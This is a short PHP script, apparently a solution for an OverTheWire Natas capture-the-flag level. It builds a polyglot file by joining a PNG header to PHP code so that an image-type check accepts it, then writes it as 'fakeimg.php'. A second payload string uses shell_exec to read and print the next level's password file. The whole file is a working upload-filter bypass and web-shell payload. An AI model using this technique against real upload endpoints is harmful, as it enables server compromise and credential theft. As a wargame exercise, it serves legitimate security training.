<?php

$valid_png_header = "\x89PNG\r\n\x1A\n"
    . "\x00\x00\x00\rIHDR"
    . "\x00\x00\x00\x01\x00\x00\x00\x01"
    . "\x08\x02\x00\x00\x00\x9C\x7F\x8D\xF3"
    . "\x00\x00\x00\x0CIDATx\xDA"
    . "\x63\x60\x60\x60\x00\x00\x00\x01"
    . "\x00\x01\x01\x00\x00\x00\x00\x00"
    . "\x00\x00\x00\x00\x00\x00\x00\x00"
    . "\x00\x00\x00\x00\x00\x00\x00\x00"
    . "\x00\x00\x00\x00\x00\x00\x00\x00"
    . "\x00\x00\x00\x00\x00\x00\x00\x00";

$php_code = "<?php\n"
    . "echo \"This is a PHP file.\";\n"
    . "?>";

$combined_content = $valid_png_header . $php_code;
file_put_contents('fakeimg.php', $combined_content);

// Verify the file type
$file_type = exif_imagetype('fakeimg.php');
if ($file_type === false) {
    echo "The file is not recognized as an image.\n";
} else {
    echo "The file is recognized as an image of type: $file_type\n";
}

$php_code = "<?php\n"
    . "\$out = shell_exec(\"cat /etc/natas_webpass/natas14\");\n"
    . "echo \"<pre>\$out</pre>\";\n"
    . "?>";
?>